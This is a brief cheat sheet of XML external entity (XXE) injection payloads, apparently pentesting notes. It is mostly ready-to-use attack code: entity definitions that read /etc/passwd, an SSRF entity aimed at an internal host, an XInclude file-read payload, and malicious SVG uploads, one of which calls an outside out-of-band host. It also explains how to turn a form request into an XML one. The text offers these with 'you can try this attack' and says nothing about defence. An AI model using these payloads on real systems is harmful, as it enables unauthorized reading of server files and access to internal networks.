- If in a request you have `xml` body  like this : 
```xml
<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>
```

- You can try this attack : 
```xml 
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```

- You can also performed  a SSRF :
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

- XInclude (server-side XML) : 
```sh
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

- Via file upload that accepts SVG image : 
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="23" x="8" y="28">&fetch;</text>
</svg>
```

OR

```sh
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://5y4g40b6lcapqz14hupvgwkptgz7nxbm.oastify.com/" >]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- Content-Type: From x-www-urlencoded to XML

If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

